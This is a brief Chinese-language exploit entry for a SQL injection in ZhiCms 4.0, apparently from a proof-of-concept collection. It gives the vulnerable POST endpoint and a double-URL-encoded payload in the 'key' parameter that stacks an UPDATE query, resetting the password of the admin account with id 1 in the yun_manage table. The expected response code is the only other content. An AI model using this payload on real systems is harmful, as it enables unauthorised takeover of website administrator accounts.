# ZhiCms4.0SQL漏洞

ZhiCms4 ｜ 其他 ｜ —
- **请求**：`POST /index.php?r=index/m/getindexdata HTTP/1.1`

**Payload**
```
action=search&key=%2525%2527%253Bupdate%2520yun%255Fmanage%2520set%2520password%253D%2527bbe375100175e7b98339a98e0a07083b%2527%2520where%2520id%253D%25271%2527%253BSELECT%2520%252A%2520FROM%2520%2560yun%255Farticle%2560%2520%2520WHERE%2520%2560title%2560%2520LIKE%2520%2520%2527%2525&mall=
```
- **响应特征**：200